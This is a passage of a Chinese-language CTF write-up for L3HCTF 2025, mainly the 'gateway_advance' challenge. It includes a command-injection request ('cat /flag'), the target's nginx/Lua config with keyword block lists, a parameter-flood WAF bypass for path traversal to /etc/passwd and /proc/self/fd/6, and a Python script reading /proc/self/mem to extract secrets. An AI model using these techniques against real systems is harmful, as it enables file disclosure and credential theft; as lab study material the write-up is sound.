Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwljjEOAjEMBP_imsJO7MS5zyDHsQUS1Z2oEH8nEsU2u7PSfOCeZ1wPONJeV9zg_lxwgDsqE7P5dJlEiJ5O04tkzbYjYtNKtuWqWpBMBorVFsYx2mDBhYu7UlJ4MO3XzBDtuos9CK2hSLP3rIQlzZEEN4EpdTBskfcV59-GEL4_UgMvzQ.aHXh4g.HH_RTaBH9nTKqiAAYooVAu2G1VQ
Connection: keep-alive




5、GET /ip_detail/user14.gif?os=os&amp;a=cat%20/flag HTTP/1.1
Host: 127.0.0.1:8081
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: session=.eJwljjEOAjEMBP_imsJO7MS5zyDHsQUS1Z2oEH8nEsU2u7PSfOCeZ1wPONJeV9zg_lxwgDsqE7P5dJlEiJ5O04tkzbYjYtNKtuWqWpBMBorVFsYx2mDBhYu7UlJ4MO3XzBDtuos9CK2hSLP3rIQlzZEEN4EpdTBskfcV59-GEL4_UgMvzQ.aHXh4g.HH_RTaBH9nTKqiAAYooVAu2G1VQ
Connection: keep-alive

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/b286bc508b1223e32722f6541af48c18.png"></p>
<hr>
<h3 id="gateway-advance"><a href="#gateway-advance" class="headerlink" title="gateway_advance"></a>gateway_advance</h3><p><a target="_blank" rel="noopener" href="https://github.com/p0pr0ck5/lua-resty-waf/issues/280">ngx.req.get_uri_args() can’t get more than 100 request arguments · Issue #280 · p0pr0ck5/lua-resty-waf</a></p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">worker_processes</span> <span class="token number">1</span></span><span class="token punctuation">;</span>

<span class="token directive"><span class="token keyword">events</span></span> <span class="token punctuation">{</span>
    <span class="token directive"><span class="token keyword">use</span> epoll</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">worker_connections</span> <span class="token number">10240</span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token directive"><span class="token keyword">http</span></span> <span class="token punctuation">{</span>
    <span class="token directive"><span class="token keyword">include</span> mime.types</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">default_type</span> text/html</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">access_log</span> <span class="token boolean">off</span></span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">error_log</span> /dev/null</span><span class="token punctuation">;</span>
    <span class="token directive"><span class="token keyword">sendfile</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span>

    <span class="token directive"><span class="token keyword">init_by_lua_block</span></span> <span class="token punctuation">{</span>
        f = io.open("/flag", "r")
        f2 = io.open("/password", "r")
        flag = f:read("*all")
        password = f2:read("*all")
        f:close()
        password = string.gsub(password, "[\n\r]", "")
        os.remove("/flag")
        os.remove("/password")
    <span class="token punctuation">}</span>

    <span class="token directive"><span class="token keyword">server</span></span> <span class="token punctuation">{</span>
        <span class="token directive"><span class="token keyword">listen</span> <span class="token number">80</span> default_server</span><span class="token punctuation">;</span>
        <span class="token directive"><span class="token keyword">location</span> /</span> <span class="token punctuation">{</span>
            <span class="token directive"><span class="token keyword">content_by_lua_block</span></span> <span class="token punctuation">{</span>
                ngx.say("hello, <span class="token directive"><span class="token keyword">world!")</span>
            }
        }

        location /static {
            alias /www/;
            access_by_lua_block {
                if ngx.var.remote_addr ~= <span class="token string">"127.0.0.1"</span> then
                    ngx.exit(403)
                end
            }
            add_header Accept-Ranges bytes;
        }

        
   <span class="token comment">#local blacklist = {"%.", "/", "</span></span><span class="token punctuation">;</span>", "flag", "proc"<span class="token punctuation">}</span>
<span class="token comment">#定义敏感字符 / 关键词黑名单：</span>
<span class="token comment">#%.（点号，转义是因为.在 Lua 模式匹配中是通配符）和 /（斜杠）：防止路径遍历攻击（如 ../ 访问上级目录）。</span>
<span class="token comment">#;（分号）：防止命令注入（如拼接系统命令）。</span>
<span class="token comment">#flag、proc：CTF 中常见的敏感关键词（flag 是目标文件，proc 对应 Linux /proc 进程目录，可能泄露系统信息）。</span>
<span class="token comment">#local args = ngx.req.get_uri_args()</span>
<span class="token comment">#获取 URL 中的查询参数（如 ?filename=test.txt 中的 filename 和 test.txt）。</span>
<span class="token comment">#for k, v in pairs(args) do</span>
<span class="token comment">#遍历所有查询参数（k 是参数名，v 是参数值，支持多值参数如 ?a=1&amp;a=2）。</span>
<span class="token comment">#for _, b in ipairs(blacklist) do</span>
<span class="token comment">#嵌套遍历黑名单中的每个敏感字符 b。</span>
<span class="token comment">#if string.find(v, b) then ngx.exit(403)</span>
<span class="token comment">#检查参数值 v 中是否包含 b，若包含则立即返回 403 禁止访问（拦截恶意请求）。     </span>
        <span class="token directive"><span class="token keyword">location</span> /download</span> <span class="token punctuation">{</span>
            <span class="token directive"><span class="token keyword">access_by_lua_block</span></span> <span class="token punctuation">{</span>
                <span class="token directive"><span class="token keyword">local</span> blacklist =</span> <span class="token punctuation">{</span>"%.", "/", "<span class="token punctuation">;</span>", "flag", "proc"<span class="token punctuation">}</span>
                local args = ngx.req.get_uri_args()
                for k, v in pairs(args) do
                    for _, b in ipairs(blacklist) do
                        if string.find(v, b) then
                            ngx.exit(403)
                        end
                    end
                end
            <span class="token punctuation">}</span>
            <span class="token directive"><span class="token keyword">add_header</span> Content-Disposition <span class="token string">"attachment; filename=download.txt"</span></span><span class="token punctuation">;</span>
            <span class="token directive"><span class="token keyword">proxy_pass</span> http://127.0.0.1/static<span class="token variable">$arg_filename</span></span><span class="token punctuation">;</span>
            <span class="token comment">#将当前 /download 请求转发到本地（127.0.0.1）的 /static 路径，并拼接查询参数 filename 的值。</span>
<span class="token comment">#例如：若请求为 http://xxx/download?filename=file.txt，则实际转发到 http://127.0.0.1/static/file.txt。</span>
<span class="token comment">#结合前文配置，/static 路径映射到服务器本地的 /www/ 目录，且仅允许本地 IP 访问，因此该代理实现了 “外部通过 /download 间接访问 /static 资源” 的逻辑。</span>
            <span class="token directive"><span class="token keyword">body_filter_by_lua_block</span></span> <span class="token punctuation">{</span>
                <span class="token directive"><span class="token keyword">local</span> blacklist =</span> <span class="token punctuation">{</span>"flag", "l3hsec", "l3hctf", "password", "secret", "confidential"<span class="token punctuation">}</span>
                for _, b in ipairs(blacklist) do
                    if string.find(ngx.arg[1], b) then
                    <span class="token comment">#ngx.arg[1] 是响应体的片段（因 Nginx 处理响应是流式的，可能分多次处理）。</span>
                        ngx.arg[1] = string.rep("*", string.len(ngx.arg[1]))
                    <span class="token comment">#过滤逻辑按数据块处理而非整体处理.当只读取1字节时，不可能包含完整敏感词（如"password"=8字节）单字节响应永远不会触发过滤</span>
                    end
                end
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>

        <span class="token directive"><span class="token keyword">location</span> /read_anywhere</span> <span class="token punctuation">{</span>
            <span class="token directive"><span class="token keyword">access_by_lua_block</span></span> <span class="token punctuation">{</span>
                if ngx.var.http_x_gateway_password ~= password then
                    ngx.say("go find the password first!")
                    ngx.exit(403)
                end
            <span class="token punctuation">}</span>
            <span class="token directive"><span class="token keyword">content_by_lua_block</span></span> <span class="token punctuation">{</span>
                local f = io.open(ngx.var.http_x_gateway_filename, "r")
                if not f then
                    ngx.exit(404)
                end
                local start = tonumber(ngx.var.http_x_gateway_start) or 0
                local length = tonumber(ngx.var.http_x_gateway_length) or 1024
                if length &gt; 1024 * 1024 then
                    length = 1024 * 1024
                end
                f:seek("set", start)
                local content = f:read(length)
                f:close()
                ngx.say(content)
                ngx.header["Content-Type"] = "application/octet-stream"
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">/download?&amp;a0=0&amp;a1=1&amp;a2=2&amp;a3=3&amp;a4=4&amp;a5=5&amp;a6=6&amp;a7=7&amp;a8=8&amp;a9=9&amp;a10=10&amp;a11=11&amp;a12=12&amp;a13=13&amp;a14=14&amp;a15=15&amp;a16=16&amp;a17=17&amp;a18=18&amp;a19=19&amp;a20=20&amp;a21=21&amp;a22=22&amp;a23=23&amp;a24=24&amp;a25=25&amp;a26=26&amp;a27=27&amp;a28=28&amp;a29=29&amp;a30=30&amp;a31=31&amp;a32=32&amp;a33=33&amp;a34=34&amp;a35=35&amp;a36=36&amp;a37=37&amp;a38=38&amp;a39=39&amp;a40=40&amp;a41=41&amp;a42=42&amp;a43=43&amp;a44=44&amp;a45=45&amp;a46=46&amp;a47=47&amp;a48=48&amp;a49=49&amp;a50=50&amp;a51=51&amp;a52=52&amp;a53=53&amp;a54=54&amp;a55=55&amp;a56=56&amp;a57=57&amp;a58=58&amp;a59=59&amp;a60=60&amp;a61=61&amp;a62=62&amp;a63=63&amp;a64=64&amp;a65=65&amp;a66=66&amp;a67=67&amp;a68=68&amp;a69=69&amp;a70=70&amp;a71=71&amp;a72=72&amp;a73=73&amp;a74=74&amp;a75=75&amp;a76=76&amp;a77=77&amp;a78=78&amp;a79=79&amp;a80=80&amp;a81=81&amp;a82=82&amp;a83=83&amp;a84=84&amp;a85=85&amp;a86=86&amp;a87=87&amp;a88=88&amp;a89=89&amp;a90=90&amp;a91=91&amp;a92=92&amp;a93=93&amp;a94=94&amp;a95=95&amp;a96=96&amp;a97=97&amp;a98=98&amp;a=information_schemas&amp;filename=../etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<ol>
<li><p><strong><code>/proc</code> 文件系统</strong><br><code>/proc</code> 是 Linux 系统中的虚拟文件系统，用于提供进程和系统内核的实时信息，并非实际存储在磁盘上。其中每个以数字命名的子目录（如 <code>/proc/1</code>）对应一个进程的 ID（PID），包含该进程的详细信息（如内存、文件描述符、环境变量等）。</p>
</li>
<li><p><strong><code>/proc/[PID]/fd</code> 目录</strong><br>每个进程的 <code>/proc/[PID]/fd</code> 目录下，会以数字（0、1、2、3…）命名的符号链接，每个链接对应进程当前打开的一个文件描述符。例如：</p>
<ul>
<li><code>0</code>：标准输入（stdin）</li>
<li><code>1</code>：标准输出（stdout）</li>
<li><code>2</code>：标准错误（stderr）</li>
<li>3 及以上：进程打开的其他文件、网络连接、管道等。</li>
</ul>
</li>
<li><p><strong><code>/proc/1/fd/6</code></strong></p>
<ul>
<li><code>1</code> 是进程 ID，通常对应系统初始化进程（如 <code>systemd</code>），负责启动和管理系统服务。</li>
<li><code>6</code> 是该进程打开的第 6 个文件描述符，具体指向什么内容取决于进程的行为（可能是某个配置文件、日志文件、管道或网络套接字等）。</li>
</ul>
</li>
<li><p><strong><code>/proc/self</code> 的含义</strong><br><code>/proc/self</code> 是一个动态符号链接，始终指向当前正在访问该路径的进程自身的 <code>/proc/[PID]</code> 目录（例如，当进程 A 访问 <code>/proc/self</code> 时，它等价于 <code>/proc/[A的PID]</code>）。这使得进程可以无需知道自身 PID 即可访问自己的信息。</p>
</li>
<li><p><strong><code>mem</code> 文件的作用</strong><br><code>/proc/self/mem</code> 以二进制形式直接映射当前进程的虚拟内存空间，允许进程通过读写该文件来<strong>直接操作自身的内存数据</strong>（如修改变量值、注入代码等）。</p>
<ul>
<li>读操作：可获取内存中指定地址的数据（需知道具体内存地址，且该地址必须是进程可访问的）。</li>
<li>写操作：可修改内存中指定地址的数据（同样受进程权限和内存保护机制限制，如只读内存页无法写入）。</li>
</ul>
</li>
</ol>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">GET /download?&amp;a0=0&amp;a1=1&amp;a2=2&amp;a3=3&amp;a4=4&amp;a5=5&amp;a6=6&amp;a7=7&amp;a8=8&amp;a9=9&amp;a10=10&amp;a11=11&amp;a12=12&amp;a13=13&amp;a14=14&amp;a15=15&amp;a16=16&amp;a17=17&amp;a18=18&amp;a19=19&amp;a20=20&amp;a21=21&amp;a22=22&amp;a23=23&amp;a24=24&amp;a25=25&amp;a26=26&amp;a27=27&amp;a28=28&amp;a29=29&amp;a30=30&amp;a31=31&amp;a32=32&amp;a33=33&amp;a34=34&amp;a35=35&amp;a36=36&amp;a37=37&amp;a38=38&amp;a39=39&amp;a40=40&amp;a41=41&amp;a42=42&amp;a43=43&amp;a44=44&amp;a45=45&amp;a46=46&amp;a47=47&amp;a48=48&amp;a49=49&amp;a50=50&amp;a51=51&amp;a52=52&amp;a53=53&amp;a54=54&amp;a55=55&amp;a56=56&amp;a57=57&amp;a58=58&amp;a59=59&amp;a60=60&amp;a61=61&amp;a62=62&amp;a63=63&amp;a64=64&amp;a65=65&amp;a66=66&amp;a67=67&amp;a68=68&amp;a69=69&amp;a70=70&amp;a71=71&amp;a72=72&amp;a73=73&amp;a74=74&amp;a75=75&amp;a76=76&amp;a77=77&amp;a78=78&amp;a79=79&amp;a80=80&amp;a81=81&amp;a82=82&amp;a83=83&amp;a84=84&amp;a85=85&amp;a86=86&amp;a87=87&amp;a88=88&amp;a89=89&amp;a90=90&amp;a91=91&amp;a92=92&amp;a93=93&amp;a94=94&amp;a95=95&amp;a96=96&amp;a97=97&amp;a98=98&amp;a=information_schemas&amp;filename=../proc/self/fd/6 HTTP/1.1
Host: 1.95.8.146:17794
Range: bytes=23-49

dsoneverwannagiveyouup

依次弄一下，得到
passwordismemeispasswordsoneverwannagiveyouup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>在 Linux 系统中，<code>/proc/self/maps</code> 是一个特殊的伪文件，用于<strong>展示当前进程（<code>self</code> 指代访问该文件的进程自身）的内存映射信息</strong>。它记录了进程地址空间中所有的内存区域（如代码段、数据段、堆、栈、共享库、映射文件等）的详细信息，是分析进程内存布局的重要工具。</p>
<h3 id="文件内容格式"><a href="#文件内容格式" class="headerlink" title="文件内容格式"></a>文件内容格式</h3><p><code>/proc/self/maps</code> 的每一行对应进程中的一个内存区域，格式如下（以典型行为例）：</p>
<pre class="line-numbers language-none"><code class="language-none">55f8d7a00000-55f8d7a02000 r--p 00000000 08:01 1234567  /usr/bin/ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>各字段含义从左到右依次为：</p>
<ol>
<li><strong>内存地址范围</strong>（<code>55f8d7a00000-55f8d7a02000</code>）<br>该内存区域在进程虚拟地址空间中的起始地址和结束地址（十六进制），表示此区域占用的地址范围。</li>
<li><strong>权限标志</strong>（<code>r--p</code>）<br>4 个字符分别表示：<ul>
<li>第 1 位：<code>r</code>（可读）、<code>-</code>（不可读）</li>
<li>第 2 位：<code>w</code>（可写）、<code>-</code>（不可写）</li>
<li>第 3 位：<code>x</code>（可执行）、<code>-</code>（不可执行）</li>
<li>第 4 位：<code>p</code>（私有内存，如进程堆、栈）、<code>s</code>（共享内存，如共享库、匿名共享映射）</li>
</ul>
</li>
<li><strong>偏移量</strong>（<code>00000000</code>）<br>该内存区域对应的文件在磁盘上的偏移量（十六进制）。若为匿名映射（如堆、栈），此值通常为 <code>0</code>。</li>
<li><strong>设备号</strong>（<code>08:01</code>）<br>映射文件所在的设备标识符（主设备号：次设备号），匿名映射（如堆、栈）此处为 <code>00:00</code>。</li>
<li><strong>inode 号</strong>（<code>1234567</code>）<br>映射文件的 inode 编号，匿名映射此处为 <code>0</code>。</li>
<li><strong>映射来源</strong>（<code>/usr/bin/ls</code>）<br>内存区域的来源：<ul>
<li>若为文件映射，显示文件路径（如可执行文件、共享库、普通文件）。</li>
<li>若为匿名映射，可能显示 <code>[heap]</code>（堆）、<code>[stack]</code>（栈）、<code>[anon]</code>（匿名内存）等。</li>
</ul>
</li>
</ol>
</blockquote>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token directive"><span class="token keyword">init_by_lua_block</span></span> <span class="token punctuation">{</span>
        <span class="token comment"># 在最后加上一段</span>
        print(tostring(flag))
        <span class="token comment">#tostring(flag)：将 Lua 变量 flag 转换为字符串（若 flag 本身是字符串则直接返回）。</span>
<span class="token comment">#print(...)：输出到 Nginx 的错误日志（通常为 /var/log/nginx/error.log，但配置中已定向到 /dev/null）。</span>
        local ffi = require("ffi")
        local ptr = ffi.cast("const char*", flag)
        <span class="token comment">#require("ffi")：加载 LuaJIT 的 FFI 模块，该模块允许 Lua 代码直接调用 C 函数和操作 C 数据类型。</span>
<span class="token comment">#ffi.cast("const char*", flag)：将 Lua 字符串 flag 转换为 C 风格的只读字符指针（const char*）。</span>
<span class="token comment">#关键点：LuaJIT 在内存中会将字符串存储为连续的字节数组，通过 FFI 可获取该数组的起始地址。</span>
        print("Address: ", tostring(ptr))
        <span class="token comment">#tostring(ptr)：将 C 指针转换为 Lua 字符串，格式为 0xXXXXXXXXXXXXXXXX（十六进制内存地址）。</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2025/07/15/L3HCTF2025-Writeup/#title-5">L3HCTF Writeup - 星盟安全团队</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time

<span class="token comment"># === 配置项 ===</span>
TARGET <span class="token operator">=</span> <span class="token string">"http://43.138.2.216:17794/read_anywhere"</span>
PASSWORD <span class="token operator">=</span> <span class="token string">"passwordismemeispasswordsoneverwannagiveyouup"</span>
CHUNK_SIZE <span class="token operator">=</span> <span class="token number">4096</span>  <span class="token comment"># 每次读取的字节数</span>
FLAG_PREFIX <span class="token operator">=</span> <span class="token string">b"L3HCTF{"</span>


<span class="token comment"># === 读取 maps ===</span>
<span class="token keyword">def</span> <span class="token function">get_readable_ranges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">"X-Gateway-Password"</span><span class="token punctuation">:</span> PASSWORD<span class="token punctuation">,</span>
        <span class="token string">"X-Gateway-Filename"</span><span class="token punctuation">:</span> <span class="token string">"/proc/self/maps"</span><span class="token punctuation">,</span>
        <span class="token string">"X-Gateway-Start"</span><span class="token punctuation">:</span> <span class="token string">"0"</span><span class="token punctuation">,</span>
        <span class="token string">"X-Gateway-Length"</span><span class="token punctuation">:</span> <span class="token string">"65536"</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 请求 /proc/self/maps ..."</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TARGET<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"无法读取 maps: </span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    ranges <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^([0-9a-fA-F]+)-([0-9a-fA-F]+) ([rwxp\-]{4})'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>
        <span class="token keyword">if</span> m <span class="token keyword">and</span> <span class="token string">'r'</span> <span class="token keyword">in</span> m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
            end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
            ranges<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] 找到 </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>ranges<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> 个可读内存段"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> ranges


<span class="token comment"># === 搜索内存中包含 flag 的区域 ===</span>
<span class="token keyword">def</span> <span class="token function">search_flag_in_mem</span><span class="token punctuation">(</span>ranges<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> start<span class="token punctuation">,</span> end <span class="token keyword">in</span> ranges<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 扫描内存段: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        offset <span class="token operator">=</span> <span class="token number">0</span>
        <span class="token keyword">while</span> start <span class="token operator">+</span> offset <span class="token operator">&lt;</span> end<span class="token punctuation">:</span>
            size <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>CHUNK_SIZE<span class="token punctuation">,</span> end <span class="token operator">-</span> <span class="token punctuation">(</span>start <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">)</span>
            headers <span class="token operator">=</span> <span class="token punctuation">{</span>
                <span class="token string">"X-Gateway-Password"</span><span class="token punctuation">:</span> PASSWORD<span class="token punctuation">,</span>
                <span class="token string">"X-Gateway-Filename"</span><span class="token punctuation">:</span> <span class="token string">"/proc/self/mem"</span><span class="token punctuation">,</span>
                <span class="token string">"X-Gateway-Start"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>start <span class="token operator">+</span> offset<span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">"X-Gateway-Length"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">try</span><span class="token punctuation">:</span>
                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TARGET<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">200</span><span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 读取失败 status=</span><span class="token interpolation"><span class="token punctuation">{</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">}</span></span><span class="token string"> offset=</span><span class="token interpolation"><span class="token punctuation">{</span>offset<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                    <span class="token keyword">break</span>
                data <span class="token operator">=</span> r<span class="token punctuation">.</span>content
                <span class="token keyword">if</span> FLAG_PREFIX <span class="token keyword">in</span> data<span class="token punctuation">:</span>
                    index <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span>FLAG_PREFIX<span class="token punctuation">)</span>
                    <span class="token comment"># 简单截断 flag（直到遇到右大括号或 50 字节以内）</span>
                    tail <span class="token operator">=</span> data<span class="token punctuation">[</span>index<span class="token punctuation">:</span>index <span class="token operator">+</span> <span class="token number">50</span><span class="token punctuation">]</span>
                    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">rb'L3HCTF\{[^\}]{1,48}\}'</span><span class="token punctuation">,</span> tail<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n🎉 找到 flag: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> <span class="token boolean">True</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[?] 找到前缀但无法确定完整 flag: </span><span class="token interpolation"><span class="token punctuation">{</span>tail<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                        <span class="token keyword">return</span> <span class="token boolean">True</span>
                offset <span class="token operator">+=</span> size
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[!] 请求异常: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 未找到 flag"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    ranges <span class="token operator">=</span> get_readable_ranges<span class="token punctuation">(</span><span class="token punctuation">)</span>
    found <span class="token operator">=</span> search_flag_in_mem<span class="token punctuation">(</span>ranges<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
